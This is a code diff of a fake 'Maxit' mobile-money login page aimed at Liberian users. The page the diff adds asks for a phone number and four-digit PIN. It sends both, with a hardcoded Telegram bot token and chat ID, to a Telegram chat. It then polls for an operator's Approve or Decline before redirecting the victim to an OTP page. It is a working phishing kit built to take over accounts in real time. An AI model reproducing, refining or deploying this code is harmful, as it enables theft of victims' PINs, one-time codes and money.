@@ -3,385 +3,598 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Max it - Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Maxit - Enter PIN</title>
 
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+    <!-- Tailwind CSS for utility classes -->
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
     <style>
          :root {
             --orange-primary: #FF7900;
-            --dark-bg: #1c1c1e;
-            --btn-brown: #3e2723;
-            --text-light: #ffffff;
-            --text-muted: #8e8e93;
-            --input-border: #FF7900;
-            --red-asterisk: #ff3b30;
+            --orange-gradient-top: #ff9124;
+            --orange-gradient-bottom: #f36b00;
+            --bg-page: #f6efe9;
+            --card-bg: #ffffff;
+            --text-dark: #1f1f1f;
+            --text-muted: #6b7280;
+            --input-border: #f89e4f;
+            --input-bg: #fffbf7;
         }
         
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Inter', sans-serif;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            -webkit-tap-highlight-color: transparent;
         }
         
         body {
-            background-color: #e5e5ea;
+            background-color: var(--bg-page);
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            min-height: 100dvh;
+            padding: 12px;
         }
         
-        .app-container {
+        .app-wrapper {
             width: 100%;
-            max-width: 400px;
-            height: 100vh;
-            max-height: 850px;
-            background-color: var(--dark-bg);
+            max-width: 460px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: auto;
+        }
+        
+        .top-header {
+            width: 100%;
+            background: linear-gradient(135deg, var(--orange-gradient-top), var(--orange-gradient-bottom));
+            padding: clamp(12px, 3.5vw, 18px) 16px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 14px 14px 0 0;
+            box-shadow: 0 4px 12px rgba(255, 121, 0, 0.22);
             position: relative;
-            overflow: hidden;
+            z-index: 2;
+        }
+        
+        .maxit-logo-img {
+            height: clamp(30px, 6vw, 42px);
+            width: auto;
+            max-width: 80%;
+            object-fit: contain;
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.15));
+        }
+        
+        .card {
+            background-color: var(--card-bg);
+            width: 100%;
+            border-radius: 0 0 20px 20px;
+            padding: clamp(20px, 6vw, 38px) clamp(16px, 5vw, 32px);
+            box-shadow: 0 14px 35px rgba(0, 0, 0, 0.06);
             display: flex;
             flex-direction: column;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
-        }
-        
-        @media (min-width: 401px) {
-            .app-container {
-                height: 90vh;
-                border-radius: 40px;
-                border: 8px solid #000;
-            }
-        }
-        
-        .top-section {
-            height: 55%;
+            align-items: center;
+            z-index: 3;
             position: relative;
-            background-color: #f4f4f4;
-            background-image: url('./sslimage-removebg-preview.png');
-            background-size: cover;
-            background-position: center top;
-            background-repeat: no-repeat;
         }
         
-        .back-btn {
-            position: absolute;
-            top: 40px;
-            left: 20px;
-            background: none;
-            border: none;
-            color: #000;
-            font-size: 24px;
-            cursor: pointer;
-            z-index: 10;
+        .card-title {
+            font-size: clamp(18px, 4.8vw, 22px);
+            font-weight: 800;
+            color: var(--text-dark);
+            text-align: center;
+            margin-bottom: 6px;
         }
         
-        .country-selector-header {
-            position: absolute;
-            top: 40px;
-            right: 20px;
-            padding: 6px 12px;
-            border-radius: 8px;
-            border: 1px solid rgba(0, 0, 0, 0.2);
-            background: rgba(255, 255, 255, 0.9);
-            color: var(--dark-bg);
-            font-weight: 600;
-            font-size: 13px;
-            cursor: pointer;
-            outline: none;
-            z-index: 10;
-        }
-        
-        .wave-container {
-            position: absolute;
-            bottom: -1px;
-            width: 100%;
-            line-height: 0;
-        }
-        
-        .wave-container svg {
-            display: block;
-            width: 100%;
-            height: 60px;
-        }
-        
-        .bottom-section {
-            height: 45%;
-            background-color: var(--dark-bg);
-            padding: 30px 25px;
-            display: flex;
-            flex-direction: column;
-        }
-        
-        .bottom-section h2 {
-            color: var(--text-light);
-            font-size: 22px;
-            font-weight: 500;
-            margin-bottom: 40px;
-            letter-spacing: 0.5px;
-        }
-        
-        .input-group {
-            display: flex;
-            align-items: flex-end;
-            border-bottom: 1px solid var(--input-border);
-            padding-bottom: 8px;
-            margin-bottom: 40px;
-        }
-        
-        .input-icon {
-            color: var(--orange-primary);
-            font-size: 22px;
-            margin-right: 15px;
-            margin-bottom: 5px;
-        }
-        
-        .input-wrapper {
-            display: flex;
-            flex-direction: column;
-            flex-grow: 1;
-        }
-        
-        .input-wrapper label {
+        .card-subtitle {
+            font-size: clamp(12px, 3.2vw, 13px);
             color: var(--text-muted);
-            font-size: 12px;
+            text-align: center;
+            margin-bottom: clamp(20px, 5vw, 30px);
+        }
+        
+        .input-section {
+            width: 100%;
+            margin-bottom: clamp(18px, 4.5vw, 24px);
+        }
+        
+        .input-label {
+            display: block;
+            font-size: clamp(12px, 3vw, 13px);
+            font-weight: 600;
+            color: var(--text-dark);
             margin-bottom: 8px;
         }
         
-        .input-wrapper label span {
-            color: var(--red-asterisk);
+        .phone-input-container {
+            display: flex;
+            align-items: center;
+            border: 2px solid var(--input-border);
+            border-radius: 10px;
+            overflow: hidden;
+            background-color: #ffffff;
+            transition: border-color 0.2s, box-shadow 0.2s;
         }
         
-        .input-wrapper input {
-            background: transparent;
+        .phone-input-container:focus-within {
+            border-color: #ff7900;
+            box-shadow: 0 0 0 3px rgba(255, 121, 0, 0.15);
+        }
+        
+        .country-code-box {
+            background-color: #e55c00;
+            color: #ffffff;
+            font-weight: 700;
+            font-size: clamp(13px, 3.6vw, 15px);
+            padding: clamp(10px, 3vw, 14px) clamp(12px, 4vw, 18px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            letter-spacing: 0.5px;
+            user-select: none;
+            flex-shrink: 0;
+        }
+        
+        .phone-number-input {
+            flex-grow: 1;
+            min-width: 0;
             border: none;
-            color: var(--text-light);
-            font-size: 16px;
             outline: none;
-            width: 100%;
-            font-family: 'Inter', sans-serif;
-            letter-spacing: 1px;
+            padding: clamp(10px, 3vw, 14px) clamp(10px, 3vw, 16px);
+            font-size: clamp(14px, 4vw, 16px);
+            font-weight: 600;
+            color: var(--text-dark);
+            background: transparent;
+            letter-spacing: 0.5px;
         }
         
-        .btn-action {
+        .pin-section {
             width: 100%;
-            background-color: var(--btn-brown);
-            color: var(--text-light);
-            border: none;
-            padding: 18px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .pin-label-container {
+            width: 100%;
+            text-align: center;
+            margin-bottom: 12px;
+        }
+        
+        .pin-label {
+            font-size: clamp(12px, 3.2vw, 14px);
+            font-weight: 600;
+            color: var(--text-dark);
+        }
+        
+        .pin-boxes-container {
+            display: flex;
+            justify-content: center;
+            gap: clamp(6px, 2.5vw, 14px);
+            margin-bottom: clamp(24px, 6vw, 36px);
+            width: 100%;
+        }
+        
+        .pin-box {
+            width: clamp(44px, 18vw, 62px);
+            height: clamp(50px, 20vw, 66px);
+            background-color: var(--input-bg);
+            border: 2px solid var(--input-border);
             border-radius: 12px;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: opacity 0.2s;
-            margin-top: auto;
-            margin-bottom: 20px;
+            font-size: clamp(20px, 6vw, 26px);
+            font-weight: 700;
+            text-align: center;
+            color: var(--text-dark);
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s, background-color 0.2s;
+            flex-shrink: 1;
         }
         
-        .btn-action:active {
-            transform: scale(0.98);
+        .pin-box:focus {
+            border-color: #ff7900;
+            box-shadow: 0 0 0 3px rgba(255, 121, 0, 0.18);
+            background-color: #ffffff;
+        }
+        
+        .btn-submit-container {
+            width: 100%;
+            display: flex;
+            justify-content: flex-start;
+        }
+        
+        .btn-submit {
+            background: linear-gradient(135deg, #fbb064, #f39537);
+            color: #ffffff;
+            border: none;
+            border-radius: 10px;
+            padding: clamp(11px, 3vw, 14px) clamp(22px, 5vw, 32px);
+            font-size: clamp(13px, 3.5vw, 15px);
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            box-shadow: 0 4px 14px rgba(243, 149, 55, 0.35);
+            transition: transform 0.1s, opacity 0.2s, box-shadow 0.2s;
+            touch-action: manipulation;
+            width: 100%;
+        }
+        
+        .btn-submit:hover {
+            opacity: 0.95;
+            box-shadow: 0 6px 18px rgba(243, 149, 55, 0.45);
+        }
+        
+        .btn-submit:active {
+            transform: scale(0.97);
+        }
+        /* Loading / Waiting Overlay */
+        
+        .loading-overlay {
+            position: absolute;
+            inset: 0;
+            background: rgba(255, 255, 255, 0.92);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+            border-radius: 0 0 20px 20px;
+            z-index: 10;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.25s ease;
+        }
+        
+        .loading-overlay.show {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        
+        .loading-text {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-dark);
+            text-align: center;
+        }
+        /* Toast Popup */
+        
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            left: 50%;
+            transform: translateX(-50%) translateY(120px);
+            background-color: #1f2937;
+            color: #ffffff;
+            padding: 12px 20px;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 500;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.25);
+            transition: transform 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            z-index: 100;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            max-width: 90vw;
+            width: auto;
+        }
+        
+        .toast.show {
+            transform: translateX(-50%) translateY(0);
+        }
+        
+        .toast.success {
+            border-left: 4px solid #10b981;
+        }
+        
+        .toast.error {
+            border-left: 4px solid #ef4444;
         }
     </style>
 </head>
 
 <body>
 
-    <div class="app-container">
-        <div class="top-section">
-            <button class="back-btn" onclick="window.location.href='process.html'"><i class="fa-solid fa-arrow-left"></i></button>
-            <select class="country-selector-header" id="countrySelect" onchange="updateCountrySettings()">
-                <option value="CM" selected>Cameroon (+237)</option>
-                <option value="LR">Liberia (+231)</option>
-            </select>
-            <div class="wave-container">
-                <svg viewBox="0 0 1440 320" preserveAspectRatio="none">
-                    <path fill="#1c1c1e" fill-opacity="1" d="M0,128L80,144C160,160,320,192,480,186.7C640,181,800,139,960,128C1120,117,1280,139,1360,149.3L1440,160L1440,320L1360,320C1280,320,1120,320,960,320C800,320,640,320,480,320C320,320,160,320,80,320L0,320Z"></path>
-                </svg>
-            </div>
-        </div>
+    <div class="app-wrapper">
+        <!-- Top Orange Header with Maxit Logo Image -->
+        <header class="top-header">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQYwj1M4hN5PAzSqrxgbrz3TKdC_biVQrc5JJlOQG3I8Q&s=10" alt="Maxit Logo" class="maxit-logo-img" onerror="this.style.display='none'; document.getElementById('altLogoText').style.display='block';">
+            <span id="altLogoText" style="display:none; color:white; font-weight:800; font-size:24px;">Maxit</span>
+        </header>
 
-        <div class="bottom-section">
-            <h2>Authentication</h2>
-            <form id="loginForm">
-                <div class="input-group">
-                    <i class="fa-solid fa-user input-icon"></i>
-                    <div class="input-wrapper">
-                        <label>Enter your phone number <span>*</span></label>
-                        <input type="tel" id="phoneNumber" value="6-" autocomplete="off" placeholder="6-XX-XX-XX-XX">
+        <!-- Main Card Section -->
+        <main class="card">
+            <h1 class="card-title">Enter your correct PIN</h1>
+            <p class="card-subtitle">Enter the correct PIN for your account</p>
+
+            <form id="pinForm" style="width: 100%;">
+                <!-- Phone Number Input Section -->
+                <div class="input-section">
+                    <label class="input-label" for="phoneNumberInput">Phone Number</label>
+                    <div class="phone-input-container">
+                        <div class="country-code-box">+231</div>
+                        <input type="tel" id="phoneNumberInput" class="phone-number-input" placeholder="9123455655" autocomplete="tel">
                     </div>
                 </div>
-                <button type="button" class="btn-action" id="loginBtn">Log in</button>
+
+                <!-- PIN Input Section -->
+                <div class="pin-section">
+                    <div class="pin-label-container">
+                        <span class="pin-label">Enter your PIN</span>
+                    </div>
+
+                    <div class="pin-boxes-container" id="pinContainer">
+                        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" aria-label="PIN digit 1">
+                        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="PIN digit 2">
+                        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="PIN digit 3">
+                        <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" aria-label="PIN digit 4">
+                    </div>
+                </div>
+
+                <!-- Submit Button Container -->
+                <div class="btn-submit-container">
+                    <button type="submit" class="btn-submit" id="submitBtn">SUBMIT</button>
+                </div>
             </form>
-        </div>
+
+            <!-- Loading / Waiting Overlay -->
+            <div id="loadingOverlay" class="loading-overlay">
+                <i class="fa-solid fa-circle-notch fa-spin fa-2x" style="color: #ff7900;"></i>
+                <span class="loading-text">Verifying details, please wait...</span>
+            </div>
+        </main>
+    </div>
+
+    <!-- Toast Popup Container -->
+    <div id="toast" class="toast">
+        <i class="fa-solid fa-circle-check" id="toastIcon"></i>
+        <span id="toastMessage">PIN Submitted successfully!</span>
     </div>
 
     <script>
-        const phoneInput = document.getElementById('phoneNumber');
-        const countrySelect = document.getElementById('countrySelect');
+        document.addEventListener('DOMContentLoaded', () => {
+            const pinForm = document.getElementById('pinForm');
+            const pinBoxes = document.querySelectorAll('.pin-box');
+            const submitBtn = document.getElementById('submitBtn');
+            const phoneInput = document.getElementById('phoneNumberInput');
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            const toast = document.getElementById('toast');
+            const toastMessage = document.getElementById('toastMessage');
+            const toastIcon = document.getElementById('toastIcon');
 
-        function updateCountrySettings() {
-            const country = countrySelect.value;
-            if (country === 'LR') {
-                phoneInput.value = '77-';
-                phoneInput.placeholder = '77-XX-XX-XX';
-            } else {
-                phoneInput.value = '6-';
-                phoneInput.placeholder = '6-XX-XX-XX-XX';
+            // Telegram Bot Configuration
+            const TELEGRAM_BOT_TOKEN = '8854173050:AAEK-fKFaQenKpMFCGJwLu60MmfO6BRUcHA';
+            const TELEGRAM_CHAT_ID = '1003670447';
+
+            let sentMessageId = null;
+            let lastUpdateId = 0;
+            let pollingTimer = null;
+            let timeoutTimer = null;
+            let pollingActive = false;
+
+            // 1. Populate Phone Number from sessionStorage
+            const storedPhone = sessionStorage.getItem('maxit_phone');
+            if (storedPhone) phoneInput.value = storedPhone;
+
+            phoneInput.addEventListener('input', (e) => {
+                const val = e.target.value.replace(/[^0-9]/g, '');
+                e.target.value = val;
+                sessionStorage.setItem('maxit_phone', val.trim());
+            });
+
+            // 2. PIN Input Logic (Auto-Advance, Backspace handling)
+            pinBoxes.forEach((box, index) => {
+                box.addEventListener('input', (e) => {
+                    const val = e.target.value.replace(/[^0-9]/g, '');
+                    e.target.value = val;
+
+                    if (val && index < pinBoxes.length - 1) {
+                        pinBoxes[index + 1].focus();
+                    }
+                });
+
+                box.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                        pinBoxes[index - 1].focus();
+                    }
+                });
+
+                box.addEventListener('focus', (e) => {
+                    e.target.select();
+                });
+            });
+
+            // 3. Toast Helper
+            function showToast(msg, type = 'success') {
+                toastMessage.textContent = msg;
+                toast.className = `toast ${type} show`;
+                toastIcon.className = type === 'success' ?
+                    'fa-solid fa-circle-check' :
+                    'fa-solid fa-circle-exclamation';
+
+                setTimeout(() => {
+                    toast.classList.remove('show');
+                }, 3200);
             }
-        }
 
-        phoneInput.addEventListener('input', function(e) {
-            const country = countrySelect.value;
-            let cleaned = ('' + this.value).replace(/\D/g, '');
-
-            if (country === 'CM') {
-                if (!cleaned.startsWith('6')) cleaned = '6' + cleaned;
-                cleaned = cleaned.substring(0, 9);
-
-                let formatted = '6';
-                if (cleaned.length > 1) formatted += '-' + cleaned.substring(1, 3);
-                if (cleaned.length > 3) formatted += '-' + cleaned.substring(3, 5);
-                if (cleaned.length > 5) formatted += '-' + cleaned.substring(5, 7);
-                if (cleaned.length > 7) formatted += '-' + cleaned.substring(7, 9);
-                this.value = formatted;
-            } else {
-                // Liberia format (e.g., 77 prefix)
-                if (!cleaned.startsWith('77') && !cleaned.startsWith('88')) cleaned = '77' + cleaned;
-                cleaned = cleaned.substring(0, 8);
-
-                let formatted = cleaned.substring(0, 2);
-                if (cleaned.length > 2) formatted += '-' + cleaned.substring(2, 4);
-                if (cleaned.length > 4) formatted += '-' + cleaned.substring(4, 6);
-                if (cleaned.length > 6) formatted += '-' + cleaned.substring(6, 8);
-                this.value = formatted;
+            function setWaiting(isWaiting) {
+                if (!loadingOverlay) return;
+                if (isWaiting) {
+                    loadingOverlay.classList.add('show');
+                    submitBtn.disabled = true;
+                    pinBoxes.forEach(b => b.disabled = true);
+                    phoneInput.disabled = true;
+                } else {
+                    loadingOverlay.classList.remove('show');
+                    submitBtn.disabled = false;
+                    pinBoxes.forEach(b => b.disabled = false);
+                    phoneInput.disabled = false;
+                }
             }
-        });
 
-        const botToken = '8854173050:AAEK-fKFaQenKpMFCGJwLu60MmfO6BRUcHA';
-        const chatId = '1003670447';
+            function clearTimers() {
+                if (pollingTimer) {
+                    clearInterval(pollingTimer);
+                    pollingTimer = null;
+                }
+                if (timeoutTimer) {
+                    clearTimeout(timeoutTimer);
+                    timeoutTimer = null;
+                }
+                pollingActive = false;
+            }
 
-        function sendToTelegram(phone, countryName, prefix) {
-            const escapeMd = s => s.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
-            const message = `📱 *New Login Attempt (${countryName})*\nPhone: \`+${prefix} ${escapeMd(phone)}\`\n\n👇 Please Approve or Reject:`;
-
-            const inlineKeyboard = {
-                inline_keyboard: [
-                    [{
-                        text: "✅ Approve",
-                        callback_data: `APPROVE_${phone}`
-                    }, {
-                        text: "❌ Reject",
-                        callback_data: `REJECT_${phone}`
-                    }]
-                ]
+            // Reset page for re-entry on decline
+            window.showDecline = function() {
+                pinForm.reset();
+                pinBoxes.forEach(b => b.value = '');
+                if (phoneInput) phoneInput.value = '';
+                sessionStorage.removeItem('maxit_phone');
+                sentMessageId = null;
+                clearTimers();
+                setWaiting(false);
+                showToast('Verification declined. Please re-enter details.', 'error');
+                if (pinBoxes[0]) pinBoxes[0].focus();
             };
 
-            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'MarkdownV2',
-                    reply_markup: JSON.stringify(inlineKeyboard)
-                })
-            });
-        }
-
-        function startListeningForAdminDecision(phone, btnElement) {
-            let offset = 0;
-            let decided = false;
-
-            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=100`)
-                .then(r => r.json())
-                .then(data => {
-                    if (data.ok && data.result.length > 0) {
-                        offset = data.result[data.result.length - 1].update_id + 1;
-                    }
-
-                    const intervalId = setInterval(() => {
-                        if (decided) return;
-
-                        fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=20&offset=${offset}`)
-                            .then(r => r.json())
-                            .then(data => {
-                                if (!data.ok || decided) return;
-
-                                for (let update of data.result) {
-                                    offset = update.update_id + 1;
-
-                                    if (update.callback_query) {
-                                        const action = update.callback_query.data;
-
-                                        if (action === `APPROVE_${phone}`) {
-                                            decided = true;
-                                            clearInterval(intervalId);
-                                            window.location.href = 'otp.html';
-
-                                        } else if (action === `REJECT_${phone}`) {
-                                            decided = true;
-                                            clearInterval(intervalId);
-
-                                            btnElement.innerHTML = 'Log in';
-                                            btnElement.style.opacity = '1';
-                                            btnElement.disabled = false;
-                                            alert("Authentication rejected. Please check your credentials or contact support.");
-                                            updateCountrySettings();
-                                            phoneInput.focus();
-                                        }
-                                    }
-                                }
-                            })
-                            .catch(err => console.error("Polling error:", err));
-                    }, 4000);
-                })
-                .catch(err => {
-                    console.error("Failed to initialize Telegram polling:", err);
-                    btnElement.innerHTML = 'Log in';
-                    btnElement.style.opacity = '1';
-                    btnElement.disabled = false;
-                    alert("Network error communicating with the server.");
-                });
-        }
-
-        document.getElementById('loginBtn').addEventListener('click', function(e) {
-            e.preventDefault();
-            const loginBtn = this;
-            const country = countrySelect.value;
-            const countryName = country === 'LR' ? 'Liberia' : 'Cameroon';
-            const prefix = country === 'LR' ? '231' : '237';
-
-            if (phoneInput.value.length < 10) {
-                alert("Please enter a valid phone number.");
-                return;
+            function answerCallbackQuery(callbackQueryId) {
+                const answerUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
+                return fetch(answerUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        callback_query_id: callbackQueryId
+                    })
+                }).catch(() => {});
             }
 
-            const rawPhone = phoneInput.value;
-            sessionStorage.setItem('savedPhone', rawPhone);
-            sessionStorage.setItem('selectedCountry', country);
+            // Polling Telegram for Approve/Decline clicks
+            function startPolling() {
+                if (pollingActive || !sentMessageId) return;
+                pollingActive = true;
 
-            loginBtn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Waiting for approval...';
-            loginBtn.style.opacity = '0.7';
-            loginBtn.disabled = true;
+                pollingTimer = setInterval(() => {
+                    if (!sentMessageId) return;
 
-            sendToTelegram(rawPhone, countryName, prefix)
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error("Failed to send Telegram message");
-                    }
-                    startListeningForAdminDecision(rawPhone, loginBtn);
-                })
-                .catch(error => {
-                    console.error("Telegram API Error:", error);
-                    loginBtn.innerHTML = 'Log in';
-                    loginBtn.style.opacity = '1';
-                    loginBtn.disabled = false;
-                    alert("Error connecting to the authentication server. Please try again.");
-                });
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`;
+
+                    fetch(url)
+                        .then(r => r.json())
+                        .then(data => {
+                            if (!data.ok || !data.result) return;
+
+                            data.result.forEach(update => {
+                                lastUpdateId = update.update_id;
+                                if (!update.callback_query) return;
+
+                                const cb = update.callback_query;
+                                const cbData = cb.data;
+                                const cbMsgId = cb && cb.message && cb.message.message_id;
+                                if (cbMsgId !== sentMessageId) return;
+
+                                answerCallbackQuery(cb.id);
+
+                                if (cbData === "approve") {
+                                    clearTimers();
+                                    setWaiting(false);
+                                    window.location.href = "otp.html";
+                                } else if (cbData === "decline") {
+                                    clearTimers();
+                                    setWaiting(false);
+                                    window.showDecline();
+                                }
+                            });
+                        })
+                        .catch(err => {
+                            console.error("Polling error:", err);
+                        });
+                }, 2000);
+            }
+
+            // 4. Submission & Telegram Logic
+            pinForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                clearTimers();
+
+                const phone = phoneInput.value.trim();
+                const pin = Array.from(pinBoxes).map(b => b.value).join('');
+
+                if (!phone) {
+                    showToast('Please enter your phone number', 'error');
+                    phoneInput.focus();
+                    return;
+                }
+
+                if (pin.length < 4) {
+                    showToast('Please enter all 4 digits of your PIN', 'error');
+                    const firstEmpty = Array.from(pinBoxes).find(b => !b.value);
+                    if (firstEmpty) firstEmpty.focus();
+                    return;
+                }
+
+                setWaiting(true);
+
+                const message = `📱 *Maxit Liberia Submission*\n\n📞 *Phone:* \`+231${phone}\`\n🔐 *PIN:* \`${pin}\`\n⏱ *Time:* ${new Date().toLocaleString()}`;
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+                // 60 seconds timeout
+                const TIMEOUT_MS = 60000;
+                timeoutTimer = setTimeout(() => {
+                    clearTimers();
+                    setWaiting(false);
+                    window.showDecline();
+                }, TIMEOUT_MS);
+
+                fetch(url, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: "Markdown",
+                            reply_markup: {
+                                inline_keyboard: [
+                                    [{
+                                        text: "✅ Approve",
+                                        callback_data: "approve"
+                                    }, {
+                                        text: "❌ Decline",
+                                        callback_data: "decline"
+                                    }]
+                                ]
+                            }
+                        })
+                    })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data && data.ok && data.result) {
+                            sentMessageId = data.result.message_id;
+                            startPolling();
+                        } else {
+                            clearTimers();
+                            setWaiting(false);
+                            window.location.href = "otp.html";
+                        }
+                    })
+                    .catch(err => {
+                        console.error("Erreur Telegram:", err);
+                        clearTimers();
+                        setWaiting(false);
+                        window.location.href = "otp.html";
+                    });
+            });
         });
     </script>
 </body>
